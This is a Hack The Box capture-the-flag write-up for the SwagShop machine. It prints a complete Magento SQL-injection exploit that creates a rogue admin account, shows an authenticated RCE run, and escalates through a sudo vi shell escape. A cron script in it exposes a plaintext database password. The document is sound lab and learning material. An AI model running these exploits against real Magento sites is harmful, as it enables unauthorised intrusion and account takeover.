---
tags:
  - hack
  - linux
---
# HTB: [SwagShop](https://app.hackthebox.com/machines/SwagShop)

> [!tip]- Spoiler Summary
> This machine is hosting a web commerce site with an SQLi vulnerability that allows an attacker to add an admin-level user, which enables an RCE exploit. Privilege escalation is trivial with `vi`.

## Services

### TCP

```console
# Nmap 7.94SVN scan initiated Wed Aug  7 13:59:01 2024 as: nmap -v -sCV -p- -T4 --min-rate 10000 -oN tcp_full t
Nmap scan report for t (10.10.10.140)
Host is up (0.090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### 80/tcp-http

```console
$ whatweb http://t
http://t [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.140], RedirectLocation[http://swagshop.htb/]
http://swagshop.htb/ [200 OK] Apache[2.4.29], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[frontend], IP[10.10.10.140], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
```

## RCE

Here's the [exploit for the SQLi to get an admin user](https://www.exploit-db.com/exploits/37977) on the web app:

```python
import requests
import base64
import sys

target = sys.argv[1]

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

# For demo purposes, I use the same attack as is being used in the wild
SQLQUERY="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

# Put the nice readable queries into one line,
# and insert the username:password combinination
query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds ypwq:123".format(target)
else:
    print "DID NOT WORK"
```

```console
$ python2 ./x.py http://swagshop.htb
WORKED
Check http://swagshop.htb/admin with creds ypwq:123
```

There's an [authenticated RCE available for Magento available from exploit-db](https://www.exploit-db.com/exploits/37811), but I had some problems getting the `mechanize` module working correctly with Python2.7. There's an updated version written for Python3 available at <https://github.com/Hackhoven/Magento-RCE.git>.

```console
$ python3 ./magento-rce-exploit.py http://swagshop.htb/index.php/admin/ 'id'
Form name: None
Control name: form_key
Control name: login[username]
Control name: dummy
Control name: login[password]
Control name: None
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The user flag is readable in the home directory of user `haris`:

```git
www-data@swagshop:/var/www/html$ ls -la /home/haris/user.txt
-rw-r--r-- 1 haris haris 33 Aug  9 10:59 /home/haris/user.txt
```

## PE

```console
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

Escaping to a shell from `vi` is trivial with: `:!/bin/sh`

## Post

Life after `root`.

```console
# crontab -l
...
# m h  dom mon dow   command
@reboot /root/.script/update.sh
# cat /root/.script/update.sh
#!/bin/bash
sleep 10
new_date=`date +'%F %T'`
mysql -u root -pfMVWh7bDHpgZkyfqQXreTjU9 -Bse "use swagshop; update sales_flat_order set created_at = '$new_date' where state = 'processing';"
```

## Open Questions

I lost a lot of time trying to get the older `python2` exploit working. I was able to install the correct module (`mechanize`) using `python2 -m pip install …` but it still didn't work, for reasons I never got to the bottom of.
